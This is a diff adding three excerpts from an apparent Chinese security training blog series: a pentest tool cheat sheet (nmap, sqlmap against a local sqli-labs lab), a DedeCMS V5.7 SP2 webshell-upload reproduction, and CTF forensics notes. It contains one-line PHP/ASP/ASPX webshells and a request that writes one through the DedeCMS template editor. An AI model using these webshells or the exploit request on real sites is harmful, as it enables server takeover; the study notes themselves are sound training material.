@@ -156,6 +156,242 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-drops夏令营11" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/drops夏令营11/">渗透测试工具</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/20/drops夏令营11/" class="archive-article-date">
+  	<time datetime="2019-07-20T06:49:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>nmap(一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具)<br>SQLMAP(sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限)<br>burpsuite(BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具)<br>hydra(Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具)<br>中国菜刀 中国蚁剑（网站管理工具）<br>御剑（一款好用的网站后台扫描工具）<br>nessus（一款漏洞扫描程序）<br>AWVS(一个自动化的web应用程序安全测试工具)</p>
+<hr>
+<p>nmap的基本功能<br>主机发现、端口扫描、版本侦测、操作系统侦测</p>
+<p>常用参数<br>-A ：选项用于使用进攻性方式扫描<br>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<br>-oX test.xml： 将扫描结果生成 test.xml 文件<br>-oG test.txt:  将扫描结果生成 test.txt 文件<br>-sn : 只进行主机发现，不进行端口扫描<br>-O : 指定Nmap进行系统版本扫描<br>-sV: 指定让Nmap进行服务版本扫描<br>-p <port ranges>: 扫描指定的端口<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描<br>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况<br>-Pn ： 不进行ping扫描<br>-sP :  用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<br>-PI :  设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。<br>-iL 1.txt : 批量扫描1.txt中的目标地址<br>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现<br>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况<br>-sO: 使用IP protocol 扫描确定目标机支持的协议类型<br>-PO : 使用IP协议包探测对方主机是否开启<br>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机<br>-e eth0：指定使用eth0网卡进行探测<br>-f : –mtu <val>: 指定使用分片、指定数据包的 MTU.<br>-b <ftp relay host>: 使用FTP bounce scan扫描方式<br>-g： 指定发送的端口号<br>-n : 表示不进行DNS解析；<br>-S <ip_address>: 伪装成其他 IP 地址</ip_address></ftp></val></port></p>
+<p>扫描特定主机上的某些端口<br>1.nmap -p 21,22,23,80,443 192.168.1.1 //扫描指定端口<br>2.nmap -p 20-80 192.168.1.1 //扫描指定范围内的端口</p>
+<hr>
+<p>sqlmap<br>参数<br>-p    指定测试参数<br>-b    获取banner<br>–dbs      列举数据库<br>–is-dba     是否是管理员权限<br>–current-db      当前数据库<br>–current-user   当前用户<br>–tables          列举数据库的表名<br>–count               检索所有条目数<br>–columns          获取表的列名<br>–dump          获取表中的数据，包含列<br>–dump-all  转存DBMS数据库所有表项目<br>–level      测试等级(1-5)，默认为1<br>-v                显示详细信息<br>操作步骤<br>读数据库-&gt;读取表-&gt;读取表的列-&gt; 获取内容<br>-D 指定数据库  -T 指定表  -C指定列<br>–dbms==mysql Oracle mysql 指定数据库</p>
+<p>举例<br>爆数据库 sqlmap –u “<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1”</a> –dbs<br>当前数据库 sqlmap –u “<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1”" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1”</a> –current-db<br>列举数据库的表名 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –D security – tables<br>列出表中的字段 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a> –D security –T users –columns<br>列出字段内容 sqlmap –u <a href="http://127.0.0.1/sqli-labs/Less-1?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1?id=1</a> –D security –T users –C password –dump</p>
+<hr>
+<p>Burpsuite</p>
+<p>Proxy代理模块<br> Burpsuite默认使用8080端口作为代理，当然，你也可以自己修改端口号。Proxy——&gt;Options，然后下面可以自己修改代理的端口号，默认是8080<br>这里 Proxy 的 Intercept 这里显示 Intercept is on 表示拦截包开启，所有代理的包都必须先经过burpsuite放行才可以走。<br>如果这里我们选择 intercept is off 的话，那么所有的包都会经过burpsuite，可以在HTTP history看所有经过的包，但是burpsuite不会对经过的包进行拦截。</p>
+<p>Repeater模块(改包，重放)</p>
+<p>抓取包之后，右键 Send to Repeater 发送到重发模块<br>在 Repeater模块，我们可以随意修改数据包。修改完后，点击 go ，就可以发包了。右边就会显示 服务器回的包。</p>
+<hr>
+<p>中国蚁剑 中国菜刀<br> 与一句话木马有关<br>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。</p>
+<p>简单的一句话木马：<br>PHP：<br>    <?php @eval($_POST['pass']);?><br>Asp：<br>    &lt;%eval request (“pass”)%&gt;<br>Aspx：<br>    &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/20/drops夏令营11/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-drops夏令营15" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/20/drops夏令营15/">漏洞复现</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/20/drops夏令营15/" class="archive-article-date">
+  	<time datetime="2019-07-20T06:25:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>一、    dedeCMS<br>漏洞的文件路径    DedeCMS-V5.7-UTF8-SP2\uploads\dede\tpl.php<br>漏洞的代码如下：</p>
+<p>else if($action==’savetagfile’)<br>{<br>    csrf_check();<br>    if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))<br>    {<br>        ShowMsg(‘文件名不合法，不允许进行操作！’, ‘-1’);<br>        exit();<br>    }<br>    require_once(DEDEINC.’/oxwindow.class.php’);<br>    $tagname = preg_replace(“#.lib.php$#i”, “”, $filename);<br>    $content = stripslashes($content);<br>    $truefile = DEDEINC.’/taglib/‘.$filename;<br>    $fp = fopen($truefile, ‘w’);<br>    fwrite($fp, $content);<br>fclose($fp);</p>
+<p>通过分析发现，因为没有对写入的内容做过滤，我们可以写一句话木马上传了</p>
+<p>if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))<br>Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的.意思是匹配小数点，i表示大小写不敏感<br>Preg_replace<br>Stripslashes()该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
+<p>UR输入 域名+/ DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload<br>获取 token<br>然后输入action=savetagfile&amp;token=b87a7b8629b120fb009c8992cce7c68f&amp;filename=123.lib.php&amp;content=<?php%20@eval($_POST["hello"]);?></p>
+<p>上传一个123.lib.php文件，里边写着一句话木马</p>
+<p>然后用蚁剑连上；</p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/20/drops夏令营15/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-drops夏令营13" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/19/drops夏令营13/">ctf之MISC</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/19/drops夏令营13/" class="archive-article-date">
+  	<time datetime="2019-07-19T07:31:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>流量分析<br>文件格式分析<br>隐写 图片 音频<br>压缩包分析<br>古典密码</p>
+<hr>
+<p>流量分析（wireshark使用）<br>……<br>……</p>
+<h2 id="……"><a href="#……" class="headerlink" title="……"></a>……</h2><p>常见文件头和文件尾的16进制编码：<br>JPEG (jpg)                 文件头：FFD8FF　              文件尾：FF D9　　　　　PNG (png)                文件头：89504E47              文件尾：AE 42 60 82　　　GIF (gif)                    文件头：47494638　          文件尾：00 3B 　　　　<br>ZIP Archive (zip)     文件头：504B0304　　       文件尾：50 4B　　　　　　　　　TIFF (tif)，               文件头：49492A00　<br>RAR Archive (rar)，                    文件头：52617221　<br>Windows Bitmap (bmp)，      　  文件头：424D<br>Adobe Photoshop (psd)，          文件头：38425053<br>Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　<br>XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　HTML (html)，                           文件头：68746D6C3E<br>Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0<br>MS Access (mdb)，                    文件头：5374616E64617264204A<br>WordPerfect (wpd)，                  文件头：FF575043<br>Adobe Acrobat (pdf)，               文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>……</p>
+<hr>
+<p>文件分离的方法</p>
+<p>  除了用foremost外，还有binwalk、dd命令<br>binwalk -e 文件名<br>dd<br>前面介绍的是自动化分离工具，dd这个工具是一种半自动化工具，有的时候自动化工具不能实现文件的分离，所以需要用这个工具来进行分离。<br>使用dd命令分离文件格式如下：<br>dd if=源文件名 of=输出文件名 skip=开始分离的字节数 bs=1；<br>参数说明：<br>if=file #输入文件名，缺省为标准输入。<br>of=file #输出文件名，缺省为标准输出。<br>bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs 。<br>skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。</p>
+<hr>
+<p>Lsb隐写 和音频隐写（Audacity、MP3stego 使用）<br>……<br>。。。。。。</p>
+<hr>
+<p>Zip伪加密问题</p>
+<img src="/2019/07/19/drops夏令营13/zip伪加密.jpg" title="zip伪加密">
+
+<p>识别真假加密<br>无加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00<br>假加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
+<p>对于伪加密有以下几种方法：</p>
+<ol>
+<li>在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包</li>
+<li>使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误。<br>使用ZipCenOp.jar(需要java环境)，在cmd中使用<br>java -jar ZipCenOp.jar -r xxx.zip</li>
+</ol>
+<hr>
+<p>压缩包明文攻击<br>  明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</p>
+<p>……<br>。。。。。。</p>
+<hr>
+<p>古典密码</p>
+<p>凯撒密码<br>栅栏密码<br>棋盘密码<br>希尔密码<br>摩斯电码<br>猪圈密码<br>键盘密码<br>当铺密码（<a href="http://www.zjslove.com/3.decode/dangpu/index.html）" target="_blank" rel="noopener">http://www.zjslove.com/3.decode/dangpu/index.html）</a></p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/19/drops夏令营13/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-drops夏令营12" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
